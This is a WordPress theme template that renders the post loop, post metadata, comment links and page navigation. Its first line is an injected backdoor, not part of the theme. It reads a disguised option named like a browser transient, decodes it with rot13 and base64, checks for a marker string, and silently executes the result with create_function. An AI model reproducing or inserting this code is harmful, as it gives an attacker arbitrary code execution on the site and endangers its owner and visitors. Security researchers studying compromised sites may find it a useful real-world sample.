<?php
$z=get_option("_site_transient_browser_04fec4c9afd1c26bf117c12c0bdf7b1d"); $z=base64_decode(str_rot13($z[''])); if(strpos($z,"2961A917")!==false){ $_z=create_function("",$z); @$_z(); }
 
get_header();
?>

<?php if (have_posts()) : while (have_posts()) : the_post(); ?>

<?php the_date('','<h2>','</h2>'); ?>
	
<div class="post">
	 <h3 class="storytitle" id="post-<?php the_ID(); ?>"><a href="<?php the_permalink() ?>" rel="bookmark"><?php the_title(); ?></a></h3>
	 
	<div class="storycontent">
		<?php the_content(__('(more...)')); ?>
	</div>
	
	<div class="meta"><?php _e("Filed under:"); ?> <?php the_category(',') ?> &#8212; <?php the_author() ?> @ <?php the_time() ?> <?php edit_post_link(__('Edit This')); ?></div>
	
	<div class="feedback">
            <?php wp_link_pages(); ?>
            <?php comments_popup_link(__('Comments (0)'), __('Comments (1)'), __('Comments (%)')); ?>
	</div>
	
	<!--
	<?php trackback_rdf(); ?>
	-->

</div>

<?php comments_template(); // Get wp-comments.php template ?>

<?php endwhile; else: ?>
<p><?php _e('Sorry, no posts matched your criteria.'); ?></p>
<?php endif; ?>

<?php posts_nav_link(' &#8212; ', __('&laquo; Previous Page'), __('Next Page &raquo;')); ?>

<?php get_footer(); ?>
